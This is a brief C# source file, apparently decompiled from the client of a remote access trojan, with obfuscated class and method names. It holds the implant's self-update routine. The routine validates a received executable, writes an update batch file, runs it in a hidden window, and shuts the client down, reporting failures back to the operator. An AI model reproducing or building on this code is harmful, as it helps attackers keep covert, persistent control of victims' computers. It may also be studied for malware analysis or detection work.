using System;
using System.Diagnostics;
using System.IO;
using xClient.Core.Packets.ClientPackets;

public static class GClass37
{
	public static void smethod_0(GClass33 client, string newFilePath)
	{
		try
		{
			GClass42.smethod_3(newFilePath);
			if (!GClass42.smethod_2(File.ReadAllBytes(newFilePath)))
			{
				throw new Exception("no pe file");
			}
			string text = GClass42.smethod_5(newFilePath, GClass0.bool_0 && GClass0.bool_2);
			if (string.IsNullOrEmpty(text))
			{
				throw new Exception("Could not create update batch file.");
			}
			Process.Start(new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				FileName = text
			});
			if (GClass0.bool_1)
			{
				GClass38.smethod_1();
			}
			Class0.gclass34_0.method_21();
		}
		catch (Exception ex)
		{
			GClass8.DeleteFile(newFilePath);
			new SetStatus($"Update failed: {ex.Message}").Execute(client);
		}
	}
}
